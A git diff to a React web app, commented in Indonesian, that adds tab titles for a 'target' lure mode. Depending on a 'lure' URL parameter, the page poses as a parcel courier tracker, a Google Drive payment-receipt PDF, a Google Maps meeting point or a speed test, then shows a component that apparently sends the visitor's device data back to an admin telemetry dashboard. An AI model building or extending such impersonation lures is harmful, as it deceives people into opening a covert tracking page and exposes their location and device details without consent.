@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import Navbar from "./components/Navbar";
 import PixelTracker from "./components/PixelTracker";
 import HeaderInspector from "./components/HeaderInspector";
@@ -25,10 +25,31 @@ export default function App() {
     return tabParam === "track" || (!tabParam && Boolean(deviceParam));
   });
 
+  // Atur title tab browser sesuai mode (Admin vs Umpan Target)
+  useEffect(() => {
+    if (!isClientMode) {
+      document.title = "Security & Telemetry Sentinel";
+    } else {
+      const params = new URLSearchParams(window.location.search);
+      const theme = params.get("theme") || params.get("lure") || "courier";
+      if (theme === "courier") {
+        document.title = "Lacak Pengiriman Paket & Posisi Kurir";
+      } else if (theme === "gdrive") {
+        document.title = "Google Drive: Bukti_Transfer_Pembayaran.pdf";
+      } else if (theme === "maps") {
+        document.title = "Google Maps: Titik Temu Langsung";
+      } else if (theme === "speedtest") {
+        document.title = "Speedtest Sinyal & Jaringan";
+      } else {
+        document.title = "Layanan Pelacakan Kiriman";
+      }
+    }
+  }, [isClientMode]);
+
   // Mode Target / Klien (Halaman Bersih Tanpa Navbar)
   if (isClientMode) {
     return (
-      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-4 font-sans">
+      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-3 md:p-6 font-sans">
         <div className="w-full max-w-md">
           <MobileSender isStandalone={true} />
         </div>
